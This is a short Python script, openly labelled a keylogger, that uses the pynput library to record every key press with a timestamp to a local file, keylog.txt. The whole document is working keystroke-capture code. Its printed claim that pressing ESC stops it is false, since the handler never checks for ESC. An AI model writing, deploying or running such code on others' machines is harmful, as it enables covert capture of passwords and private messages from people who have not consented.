import pynput
import logging
from datetime import datetime

# Set up logging to a file
log_file = "keylog.txt"
logging.basicConfig(filename=log_file, level=logging.DEBUG, format='%(asctime)s: %(message)s')

# Function to log keys
def on_press(key):
    try:
        logging.info(f'Key pressed: {key.char}')
    except AttributeError:
        logging.info(f'Special key pressed: {key}')

# Create a listener to monitor keyboard input
with pynput.keyboard.Listener(on_press=on_press) as listener:
    print("Keylogger started. Press ESC to stop.")
    listener.join()
